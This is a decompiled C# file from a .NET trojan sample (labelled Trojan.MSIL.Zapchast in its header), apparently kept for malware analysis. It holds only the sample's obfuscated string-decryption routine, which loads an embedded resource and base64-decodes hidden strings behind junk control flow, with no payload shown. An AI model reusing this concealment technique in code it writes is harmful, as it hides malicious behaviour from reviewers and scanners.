// Decompiled with JetBrains decompiler
// Type: .
// Assembly: ShockService, Version=54.69.79.68, Culture=neutral, PublicKeyToken=null
// MVID: BEB02828-BA7E-4D9E-B44A-20BA857B8B6C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00009-msil\Trojan.MSIL.Zapchast.f-a25f06115f569984af62f2d5d5c39a94fcc87bb329fab082960bfae15d10082d.exe

using \u0002;
using System;
using System.Collections;
using System.IO;
using System.Reflection;
using System.Text;

namespace \u0002
{
  internal class \u0006
  {
    private static string \u0001;
    private static string \u0002;
    private static byte[] \u0001;
    private static Hashtable \u0001;
    private static bool \u0001;
    private static int \u0001;

    [\u0007]
    public static string \u0001(int stringID)
    {
      int index1;
      int num1;
      int count;
      string str1;
      int num2;
      do
      {
        int num3 = stringID;
        int num4;
        while (true)
        {
          int num5 = \u0006.\u0001;
          stringID = num3 - num5;
          do
          {
            if (\u0006.\u0001)
            {
              str1 = (string) \u0006.\u0001[(object) stringID];
              switch (str1)
              {
                case null:
                  goto label_5;
                default:
                  continue;
              }
            }
            else
              goto label_5;
          }
          while (false);
          goto label_27;
label_5:
          int num6 = stringID;
          byte[] numArray = \u0006.\u0001;
          int index2 = num6;
          index1 = index2 + 1;
          num1 = (int) numArray[index2];
          num4 = num1 & 128;
          if (false)
            num3 = num4;
          else
            break;
        }
        if (num4 == 0)
        {
          num2 = num1;
          if (true)
          {
            count = num2;
            if (count != 0)
              goto label_21;
          }
          else
            goto label_28;
        }
        else
          goto label_11;
      }
      while (false);
      return string.Empty;
label_11:
      int num7;
      if ((num1 & 64) == 0)
      {
        int num8 = num1 & 63;
        if (true)
          num8 <<= 8;
        int num9 = (int) \u0006.\u0001[index1++];
        count = num8 + num9;
        goto label_21;
      }
      else
        num7 = num1;
label_16:
      int num10 = (num7 & 31) << 24;
      byte[] numArray1 = \u0006.\u0001;
      int index3 = index1;
      int num11 = index3 + 1;
      int num12 = (int) numArray1[index3];
      int num13;
      if (true)
        num13 = 16;
      else
        goto label_19;
label_18:
      int num14 = num12 << num13;
      int num15 = num10 + num14;
      num12 = (int) \u0006.\u0001[num11++];
      num10 = num15;
label_19:
      num13 = 8;
      if (num13 != 0)
      {
        int num16 = num12 << num13;
        int num17 = num10 + num16;
        byte[] numArray2 = \u0006.\u0001;
        int index4 = num11;
        index1 = index4 + 1;
        int num18 = (int) numArray2[index4];
        count = num17 + num18;
        goto label_21;
      }
      else
        goto label_18;
label_28:
      num7 = num2;
      goto label_16;
label_21:
      try
      {
        byte[] bytes = Convert.FromBase64String(Encoding.UTF8.GetString(\u0006.\u0001, index1, count));
        string str2 = string.Intern(Encoding.UTF8.GetString(bytes, 0, bytes.Length));
        if (\u0006.\u0001)
        {
          try
          {
            \u0006.\u0001.Add((object) stringID, (object) str2);
          }
          catch
          {
          }
        }
        return str2;
      }
      catch
      {
        return (string) null;
      }
label_27:
      return str1;
    }

    static \u0006()
    {
      while (true)
      {
        \u0006.\u0001 = "0";
        if (true)
        {
          \u0006.\u0002 = "64";
          if (true)
          {
            \u0006.\u0001 = (byte[]) null;
            \u0006.\u0001 = (Hashtable) null;
            int num1 = 0;
            int num2;
            while (true)
            {
              \u0006.\u0001 = num1 != 0;
              num2 = 0;
              if (num2 != 0)
                num1 = num2;
              else
                break;
            }
            \u0006.\u0001 = num2;
            if (\u0006.\u0001 == "1")
            {
              if (true)
              {
                \u0006.\u0001 = true;
                if (true)
                {
                  \u0006.\u0001 = new Hashtable();
                  break;
                }
                goto label_14;
              }
              else
                goto label_14;
            }
            else
              break;
          }
          else
            goto label_15;
        }
      }
      \u0006.\u0001 = Convert.ToInt32(\u0006.\u0002);
label_14:
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
label_15:
      Stream manifestResourceStream = executingAssembly.GetManifestResourceStream("{5db49692-8b62-44e6-b0cc-cdd49a40af15}");
      if (true)
        goto label_16;
label_9:
      Stream stream;
      try
      {
        int int32 = Convert.ToInt32(stream.Length);
        \u0006.\u0001 = new byte[int32];
        stream.Read(\u0006.\u0001, 0, int32);
        stream.Close();
        return;
      }
      finally
      {
        stream?.Dispose();
      }
label_16:
      stream = manifestResourceStream;
      goto label_9;
    }
  }
}
